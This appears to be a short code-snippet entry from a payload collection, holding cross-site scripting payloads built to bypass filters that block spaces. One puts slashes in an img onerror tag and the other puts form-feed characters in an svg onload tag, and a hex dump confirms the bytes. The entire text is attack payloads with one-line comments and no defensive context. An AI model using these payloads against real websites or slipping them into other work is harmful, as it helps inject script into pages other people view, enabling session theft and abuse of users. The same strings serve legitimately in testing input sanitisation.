---
id: 15a612ce-604d-4d48-a058-ac219d0f8bc3
type: code
language: JavaScript
verified: false
created_at: '2023-04-06T03:56:42.598789+00:00'
updated_at: '2023-04-10T20:21:49.214178+00:00'
---

# Code Snippet 15a612ce

**Language**: JavaScript

```javascript
// Bypass space filter with "/"
<img/src='1'/onerror=alert(0)>

// Bypass space filter with 0x0c/^L
<svgonload=alert(1)>

$ echo "<svg^Lonload^L=^Lalert(1)^L>" | xxd
00000000: 3c73 7667 0c6f 6e6c 6f61 640c 3d0c 616c  <svg.onload.=.al
00000010: 6572 7428 3129 0c3e 0a                   ert(1).>.
```


